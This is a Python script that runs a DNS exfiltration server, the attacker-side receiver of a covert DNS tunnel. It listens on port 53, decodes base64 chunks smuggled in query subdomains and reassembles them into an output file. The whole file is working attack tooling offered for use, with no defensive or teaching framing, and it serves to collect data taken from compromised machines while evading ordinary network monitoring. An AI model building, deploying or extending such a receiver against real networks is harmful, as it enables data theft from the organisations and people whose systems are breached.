#!/usr/bin/env python3

from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import RR, A, QTYPE
import base64
import argparse
from colorama import init, Fore, Style

init(autoreset=True)

class CustomDNSLogger(DNSLogger):
    def __init__(self):
        super().__init__()
        self.processed_queries = set()

    def log_request(self, handler, request):
        query_name = str(request.q.qname)
        if query_name not in self.processed_queries:
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.CYAN}Received DNS query for: {Fore.YELLOW}{query_name}")
            self.processed_queries.add(query_name)

    def log_reply(self, handler, reply):
        pass

class ExfiltrationResolver(BaseResolver):
    def __init__(self):
        super().__init__()
        self.data_chunks = {}
    
    def resolve(self, request, handler):
        query_name = str(request.q.qname)
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.MAGENTA}Saving the received data to {args.output}...")

        try:
            subdomain = query_name.split('.')[0]
            chunk_id, encoded_data = subdomain.split('-', 1)
            chunk_id = int(chunk_id)
            decoded_data = base64.b64decode(encoded_data).decode()
            
            self.data_chunks[chunk_id] = decoded_data
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.CYAN}Received chunk {chunk_id}: {Fore.YELLOW}{decoded_data}")

            reply = request.reply()
            reply.add_answer(*self.data_chunks_response())
            return reply

        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to process query: {e}")
            reply = request.reply()
            reply.header.rcode = 3
            return reply

    def data_chunks_response(self):
        return [RR(query_name, QTYPE.A, rdata=A("0.0.0.0"), ttl=60) for query_name in self.data_chunks]

    def save_file(self, filename):
        ordered_data = ''.join(self.data_chunks[i] for i in sorted(self.data_chunks))
        with open(filename, 'a') as f:
            f.write(ordered_data)
            f.flush()
        print(f"{Style.BRIGHT}{Fore.GREEN}[+] {Style.BRIGHT}{Fore.GREEN}Data appended to {filename}")

def ParseArgs():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DNS exfiltration server.")
    parser.add_argument("-o", "--output", required=True, help="Path to the output file.")
    parser.add_argument("-p", "--port", type=int, default=53, help="Server listening port. Default is 53.")
    return parser.parse_args()

def IniServer(port, logger):
    """Initialize and start the DNS server."""
    resolver = ExfiltrationResolver()
    server = DNSServer(resolver, port=port, address="0.0.0.0", logger=logger)
    server.start_thread()
    return server, resolver

if __name__ == "__main__":
    
    # resolver = ExfiltrationResolver()
    # logger = CustomDNSLogger()
    # server = DNSServer(resolver, port=args.port, address="0.0.0.0", logger=logger)
    # server.start_thread()
    
    # parser = argparse.ArgumentParser(description="DNS exfiltration server.")
    # parser.add_argument("-o", "--output", required=True, help="Path to the output file.")
    # parser.add_argument("-p", "--port", help="Server listening port.")
    # args = parser.parse_args()

    args = ParseArgs()
    logger = CustomDNSLogger()
    server, resolver = IniServer(args.port, logger)

    try:
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] DNS Server started...")
        while True:
            pass
    except KeyboardInterrupt:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}\n[+] Saving the received data to file...")
        resolver.save_file(args.output)